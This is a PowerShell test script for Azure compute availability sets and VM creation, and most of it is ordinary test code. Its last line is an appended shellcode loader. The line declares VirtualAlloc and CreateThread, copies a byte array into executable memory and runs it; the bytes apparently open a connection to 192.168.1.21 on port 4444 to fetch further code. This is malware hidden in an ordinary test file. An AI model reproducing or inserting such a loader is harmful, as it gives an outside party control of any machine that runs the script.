














function Test-AvailabilitySet
{
    
    $rgname = Get-ComputeTestResourceName

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        $asetName = 'avs' + $rgname;
        $nonDefaultUD = 2;
        $nonDefaultFD = 3;

        $job = New-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName -Location $loc -PlatformUpdateDomainCount $nonDefaultUD -PlatformFaultDomainCount $nonDefaultFD -Sku 'Classic' -Tag @{"a"="b"} -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        for($i = 0; $i -lt 200; $i++)
        {
            $avsetname = $asetName + $i;
            New-AzAvailabilitySet -ResourceGroupName $rgname -Name $avsetname -Location $loc -PlatformUpdateDomainCount $nonDefaultUD -PlatformFaultDomainCount $nonDefaultFD -Sku 'Classic' -Tag @{"a"="b"};
        }
        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($asetName -replace ".$") + "*"

        $asets = Get-AzAvailabilitySet;
        Assert-NotNull $asets;
        Assert-True {$asets.Count -gt 200}

        $asets = Get-AzAvailabilitySet -ResourceGroupName $rgname;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $asets = Get-AzAvailabilitySet -ResourceGroupName $wildcardRgQuery;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $asets = Get-AzAvailabilitySet -Name $wildcardNameQuery;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $asets = Get-AzAvailabilitySet -Name $asetName;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $asets = Get-AzAvailabilitySet -ResourceGroupName $wildcardRgQuery -Name $asetName;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $asets = Get-AzAvailabilitySet -ResourceGroupName $wildcardRgQuery -Name $wildcardNameQuery;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $asets = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name $wildcardNameQuery;
        Assert-NotNull $asets;
        Assert-AreEqual $asetName $asets[0].Name;

        $aset = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName;
        Assert-NotNull $aset;
        Assert-AreEqual $aset.Name $asetName;
        Assert-AreEqual $nonDefaultUD $aset.PlatformUpdateDomainCount;
        Assert-AreEqual $nonDefaultFD $aset.PlatformFaultDomainCount;
        Assert-AreEqual 'Classic' $aset.Sku;
        Assert-AreEqual "b" $aset.Tags["a"];

        $job = $aset | Update-AzAvailabilitySet -Sku 'Aligned' -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $aset = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName;

        Assert-NotNull $aset;
        Assert-AreEqual $aset.Name $asetName;
        Assert-AreEqual $nonDefaultUD $aset.PlatformUpdateDomainCount;
        Assert-AreEqual $nonDefaultFD $aset.PlatformFaultDomainCount;
        Assert-AreEqual 'Aligned' $aset.Sku;

        $aset | Update-AzAvailabilitySet -Sku 'Aligned';
        $aset = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName;

        Assert-NotNull $aset;
        Assert-AreEqual $aset.Name $asetName;
        Assert-AreEqual $nonDefaultUD $aset.PlatformUpdateDomainCount;
        Assert-AreEqual $nonDefaultFD $aset.PlatformFaultDomainCount;
        Assert-AreEqual 'Aligned' $aset.Sku;

        $job = Remove-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName -Force -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        $id = New-Object System.Guid;
        Assert-True { [System.Guid]::TryParse($st.RequestId, [REF] $id) };
        Assert-AreEqual "OK" $st.StatusCode;
        Assert-AreEqual "OK" $st.ReasonPhrase;
        Assert-True { $st.IsSuccessStatusCode };

        $asets = Get-AzAvailabilitySet -ResourceGroupName $rgname;
        $avset = $asets | ? {$_.Name -eq $asetName};
        Assert-Null $avset;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-AvailabilitySetVM
{
    
    $rgname = Get-ComputeTestResourceName
    $passed = $false;

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        
        $asetName = 'aset' + $rgname;
        New-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName -Location $loc;
        $aset = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName;

        
        $vmsize = 'Standard_DS1_v2';
        $vmname = 'vm' + $rgname;
        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize -AvailabilitySetId $aset.Id;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;

        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_GRS';
        New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        $stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage -DiskSizeInGB 200;

        Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;
        Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;
        Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;
        Assert-AreEqual $p.StorageProfile.OSDisk.DiskSizeGB 200;

        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';

        $p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;
        Assert-AreEqual $p.OSProfile.AdminUsername $user;
        Assert-AreEqual $p.OSProfile.ComputerName $computerName;
        Assert-AreEqual $p.OSProfile.AdminPassword $password;

        
        $imgRef = Get-DefaultCRPImage -loc $loc;
        $p = Set-AzVMSourceImage -VM $p -PublisherName $imgRef.PublisherName -Offer $imgRef.Offer -Skus $imgRef.Skus -Version $imgRef.Version;
        Assert-NotNull $p.StorageProfile.ImageReference;
        Assert-Null $p.StorageProfile.SourceImageId;

        
        New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;
        $vm = Get-AzVM -ResourceGroupName $rgname -Name $vmname;

        
        Assert-AreEqual $vm.StorageProfile.OSDisk.Caching $osDiskCaching;
        Assert-AreEqual $vm.StorageProfile.OSDisk.Name $osDiskName;
        Assert-AreEqual $vm.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;
        Assert-AreEqual $vm.StorageProfile.OSDisk.DiskSizeGB 200;

        
        $aset = Get-AzAvailabilitySet -ResourceGroupName $rgname -Name $asetName;
        Assert-NotNull $aset.VirtualMachinesReferences;
        Assert-True { $aset.VirtualMachinesReferences.Count -gt 0 };
        Assert-AreEqual $vm.Id $aset.VirtualMachinesReferences[0].Id;

        $asets = Get-AzAvailabilitySet -ResourceGroupName $rgname;
        Assert-NotNull ($asets | ? {($_.VirtualMachinesReferences -ne $null) -and ($_.VirtualMachinesReferences[0].Id -eq $vm.Id)});

        $asets = Get-AzAvailabilitySet;
        Assert-NotNull ($asets | ? {($_.VirtualMachinesReferences -ne $null) -and ($_.VirtualMachinesReferences[0].Id -eq $vm.Id)});
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x15,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

